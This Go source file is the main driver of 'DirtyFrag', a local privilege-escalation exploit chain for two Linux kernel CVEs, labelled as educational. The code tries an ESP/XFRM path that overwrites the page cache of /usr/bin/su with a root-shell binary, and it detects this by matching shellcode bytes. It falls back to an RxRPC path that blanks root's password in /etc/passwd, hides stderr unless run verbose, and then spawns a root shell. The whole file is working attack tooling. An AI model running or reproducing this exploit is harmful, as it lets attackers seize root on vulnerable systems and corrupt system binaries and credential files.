package main

// DirtyFrag - Go port of the CVE-2026-43284 / CVE-2026-43500 LPE chain.
// For educational purposes - study of kernel page-cache write primitives.
//
// Chain:
//   1. ESP/XFRM path  → overwrites /usr/bin/su page-cache with root-shell ELF
//   2. RxRPC fallback → patches /etc/passwd root entry (nullok)
//   3. Spawn root shell via `su -` in a fresh PTY

import (
	"fmt"
	"os"
	"syscall"
)

func suAlreadyPatched() bool {
	marker := []byte{0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a}
	f, err := os.Open("/usr/bin/su")
	if err != nil {
		return false
	}
	defer f.Close()
	got := make([]byte, len(marker))
	if _, err := f.ReadAt(got, 0x78); err != nil {
		return false
	}
	for i := range marker {
		if got[i] != marker[i] {
			return false
		}
	}
	return true
}

func passwdAlreadyPatched() bool {
	f, err := os.Open("/etc/passwd")
	if err != nil {
		return false
	}
	defer f.Close()
	head := make([]byte, 9)
	if _, err := f.Read(head); err != nil {
		return false
	}
	return string(head) == "root::0:0"
}

func eitherPatched() bool {
	return suAlreadyPatched() || passwdAlreadyPatched()
}

func main() {
	// Detect re-exec as namespace-isolated ESP worker child.
	if os.Getenv(ESPWorkerEnv) == "1" {
		RunESPWorker()
		return
	}

	if os.Getuid() == 0 {
		// Already root - just exec a shell.
		syscall.Exec("/bin/bash", []string{"bash"}, os.Environ())
		os.Exit(1)
	}

	verbose := os.Getenv("DIRTYFRAG_VERBOSE") != ""
	forceESP := false
	forceRxRPC := false

	for _, arg := range os.Args[1:] {
		switch arg {
		case "--force-esp":
			forceESP = true
		case "--force-rxrpc":
			forceRxRPC = true
		case "-v", "--verbose":
			verbose = true
		}
	}

	// Silence stderr unless verbose.
	var savedErr int = -1
	if !verbose {
		savedErr = silenceStderr()
	}

	patched := false

	switch {
	case forceRxRPC:
		if rxrpcLPE() {
			patched = true
		}
		for i := 0; !passwdAlreadyPatched() && i < 3; i++ {
			rxrpcLPE()
		}
		patched = passwdAlreadyPatched()

	case forceESP:
		patched = suLPE()

	default:
		patched = suLPE()
		if !suAlreadyPatched() {
			if rxrpcLPE() {
				patched = true
			}
			for i := 0; !passwdAlreadyPatched() && i < 3; i++ {
				rxrpcLPE()
			}
			patched = eitherPatched()
		}
	}

	if !verbose && savedErr >= 0 {
		restoreStderr(savedErr)
	}

	if patched {
		if err := runRootPTY(); err != nil {
			fmt.Fprintf(os.Stderr, "PTY error: %v\n", err)
		}
		return
	}

	fmt.Fprintln(os.Stderr, "dirtyfrag-go: failed")
	os.Exit(1)
}

func silenceStderr() int {
	saved, _ := syscall.Dup(syscall.Stderr)
	dn, err := syscall.Open("/dev/null", syscall.O_WRONLY, 0)
	if err == nil {
		syscall.Dup2(dn, syscall.Stderr) //nolint:errcheck
		syscall.Close(dn)
	}
	return saved
}

func restoreStderr(saved int) {
	if saved >= 0 {
		syscall.Dup2(saved, syscall.Stderr) //nolint:errcheck
		syscall.Close(saved)
	}
}
